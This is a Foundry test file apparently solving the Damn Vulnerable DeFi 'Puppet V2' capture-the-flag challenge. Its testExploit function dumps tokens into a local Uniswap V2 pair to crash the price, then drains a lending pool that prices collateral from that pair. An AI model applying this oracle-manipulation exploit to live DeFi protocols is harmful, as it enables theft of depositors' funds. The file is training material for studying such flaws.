// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/WETH.sol";
import "src/DamnValuableToken.sol";

import "src/PuppetV2/PuppetV2Pool.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "src/Puppetv2/Interfaces.sol";

// Challenge #9 - Puppet V2
// https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/

contract Attack is Test {
    DamnValuableToken public token;
    WETH public weth;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    IUniswapV2Pair internal uniswapV2Pair;
    PuppetV2Pool public lendingPool;

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    function setUp() public {
        vm.deal(hacker, ATTACKER_INITIAL_ETH_BALANCE);
        assertEq(hacker.balance, ATTACKER_INITIAL_ETH_BALANCE);

        token = new DamnValuableToken();
        weth = new WETH();

        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/PuppetV2/build-uniswap-v2/UniswapV2Factory.json", abi.encode(0x0)));
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/PuppetV2/build-uniswap-v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), UNISWAP_INITIAL_TOKEN_RESERVE, 0, 0, address(this), block.timestamp * 2
        );

        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
        assertGt(uniswapV2Pair.balanceOf(address(this)), 0);

        lendingPool = new PuppetV2Pool(address(weth),address(token),address(uniswapV2Pair),address(uniswapV2Factory));

        token.transfer(hacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(lendingPool.calculateDepositOfWETHRequired(1e18), 3 * 1e17);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 * 1e18);
    }

    function testExploit() public {
        // Attack Code:
        vm.startPrank(hacker);

        token.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
        address[] memory swapAddress = new address[](2);
        swapAddress[0] = address(token);
        swapAddress[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE, 1, swapAddress, hacker, block.timestamp + 5000
        );

        uint256 reserveA = token.balanceOf(address(uniswapV2Pair));
        console.log("Pair token balance: ", reserveA);
        uint256 reserveB = weth.balanceOf(address(uniswapV2Pair));
        console.log("Pair ETH balance: ", reserveB);
        uint256 bal = weth.balanceOf(hacker);
        console.log("Hacker ETH balance: ", bal);
        uint256 amountIn = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Amount required to drain the pool", amountIn);

        weth.deposit{value: amountIn}();
        weth.approve(address(lendingPool), amountIn);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();

        assertEq(token.balanceOf(hacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), 0);
    }
}
